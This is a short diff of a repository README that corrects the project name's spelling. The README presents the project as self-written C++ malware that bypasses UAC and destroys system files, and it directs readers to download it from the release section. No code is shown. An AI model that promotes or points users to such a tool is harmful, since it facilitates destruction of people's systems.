@@ -1,4 +1,4 @@
-# DimethlyMercury
+# DimethylMercury
 
 # This Is A Malware Created By Me In C++ Which Can Bypass UAC (Please Download It From The Release Section Located at the right
 # This Malware Can Destroy System Files
